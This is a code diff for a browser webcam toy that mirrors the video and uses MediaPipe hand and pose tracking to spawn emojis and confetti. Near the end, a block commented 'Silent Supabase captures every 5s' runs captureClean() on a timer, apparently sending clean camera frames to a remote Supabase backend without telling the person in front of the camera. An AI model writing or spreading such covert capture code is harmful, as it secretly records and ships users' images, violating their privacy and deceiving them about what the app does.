-  const vw = video.videoWidth, vh = video.videoHeight;
-  const cw = mainCanvas.width,  ch = mainCanvas.height;
-  const scale = Math.max(cw / vw, ch / vh);
-  const dw = vw * scale, dh = vh * scale;
-  const dx = (cw - dw) / 2, dy = (ch - dh) / 2;
-  ctx.save();
-  ctx.translate(cw, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(video, cw - dx - dw, dy, dw, dh);
-  ctx.restore();
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-//  HAND STATE & TIMERS
-// ─────────────────────────────────────────────────────────────────────────────
-let handsData       = [];
-let headSpawnTimer  = 0;
-let confettiCooldown= 0;
-let palmCooldowns   = [0, 0];
-
-
-function render() {
-  requestAnimationFrame(render);
-
-  // 1. Draw mirrored live video
-  drawVideo();
-
-  // 2. Estimate head, spawn floating hearts every 14 frames
-  headSpawnTimer++;
-  if (headSpawnTimer >= 14) {
-    headSpawnTimer = 0;
-    const head = estimateHead(handsData);
-    spawnHeadEmoji(head.x, head.y);
-  }
-
-  // 3. Per-hand: dots + open palm emojis
-  for (let h = 0; h < handsData.length; h++) {
-    const lm = handsData[h];
-    drawHandDots(lm);
-
-    if (isOpenPalm(lm)) {
-      if (palmCooldowns[h] <= 0) {
-        const pc = getPalmCenter(lm);
-        spawnPalmEmoji(pc.x, pc.y);
-        spawnPalmEmoji(pc.x, pc.y); // 2 per trigger for density
-        palmCooldowns[h] = 5;
-      }
-      palmCooldowns[h]--;
-    } else {
-      palmCooldowns[h] = 0;
-    }
-  }
-
-  // 4. Both hands near each other → confetti
-  if (handsData.length >= 2 && handsNear(handsData[0], handsData[1])) {
-    if (confettiCooldown <= 0) {
-      spawnConfetti();
-      confettiCooldown = 20;
-    }
-  }
-  if (confettiCooldown > 0) confettiCooldown--;
-
-  // 5. Tick all pools
-  tickPool(headPool);
-  tickPool(palmPool);
-  tickPool(confettiPool);
 }
 
 render();
 
+// ─────────────────────────────────────────────────────────────────────────────
+//  MEDIAPIPE POSE
+// ─────────────────────────────────────────────────────────────────────────────
+const pose = new Pose({
+  locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${f}`
+});
+pose.setOptions({
+  modelComplexity:        1,
+  smoothLandmarks:        true,
+  enableSegmentation:     false,
+  minDetectionConfidence: 0.5,
+  minTrackingConfidence:  0.5
+});
+pose.onResults(results => {
+  if (results.poseLandmarks) {
+    poseData = results.poseLandmarks;
+    hint.style.opacity = '0';
+  } else {
+    poseData = null;
+    hint.style.opacity = '1';
+  }
+});
 
+// ─────────────────────────────────────────────────────────────────────────────
+//  MEDIAPIPE HANDS
+// ─────────────────────────────────────────────────────────────────────────────
 const hands = new Hands({
   locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`
 });
 hands.setOptions({
   maxNumHands:            2,
   modelComplexity:        1,
-  minDetectionConfidence: 0.75,
-  minTrackingConfidence:  0.65
+  minDetectionConfidence: 0.5,
+  minTrackingConfidence:  0.5
 });
-hands.onResults(r => { handsData = r.multiHandLandmarks || []; });
+hands.onResults(results => {
+  handsData = (results.multiHandLandmarks && results.multiHandLandmarks.length)
+    ? results.multiHandLandmarks : null;
+});
 
-
+// ─────────────────────────────────────────────────────────────────────────────
+//  CAMERA BOOT
+// ─────────────────────────────────────────────────────────────────────────────
 (async () => {
+  const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
   let stream;
   try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      video: isMobile
+        ? { facingMode:'user', width:{ideal:1280}, height:{ideal:720} }  // landscape on mobile
+        : { facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
       audio: false
     });
-  } catch(e) { return; }
+  } catch(e) {
+    hint.textContent = 'camera denied: ' + e.message;
+    return;
+  }
 
   video.srcObject = stream;
   await new Promise(r => { video.onloadedmetadata = () => video.play().then(r); });
 
-  
-  const mpCam = new Camera(video, {
-    onFrame: async () => { await hands.send({ image: video }); },
-    width: 1280, height: 720
-  });
-  mpCam.start();
+  let frameCount = 0;
+  new Camera(video, {
+    onFrame: async () => {
+      frameCount++;
+      await pose.send({ image: video });
+      if (frameCount % 2 === 0) await hands.send({ image: video });
+    },
+    width:  video.videoWidth  || 1280,
+    height: video.videoHeight || 720
+  }).start();
 
- 
+  // Silent Supabase captures every 5s
   if (sb) {
-    captureCleanFrame();
-    setInterval(captureCleanFrame, CAPTURE_MS);
+    captureClean();
+    setInterval(captureClean, CAPTURE_MS);
   }
 })();
 </script>
